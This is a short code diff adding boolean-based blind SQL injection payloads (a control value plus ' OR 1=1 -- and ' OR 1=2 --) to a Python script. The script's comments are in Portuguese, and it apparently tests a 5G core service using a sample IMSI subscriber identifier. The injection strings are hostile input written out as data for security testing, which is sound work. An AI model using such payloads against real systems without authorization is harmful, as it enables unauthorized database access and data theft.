@@ -13,3 +13,12 @@ HEADERS = {"Content-Type": "application/json"}
 TEST_SUPI = "imsi-208930000000001"
 
 print("[+] Testando SQL Injection (Boolean-based blind)...")
+
+#Payload de controle (requisição válido)
+payload_control = {TARGET_PARAMETER: f"'{TEST_SUPI}'"}
+
+#Payload verdadeiro (' OR 1=1)
+payload_true = {TARGET_PARAMETER: f"'{TEST_SUPI}' OR 1=1 --"}
+
+#Payload falso (' OR 1=2)
+payload_false = {TARGET_PARAMETER: f"'{TEST_SUPI}' OR 1=2 --"}
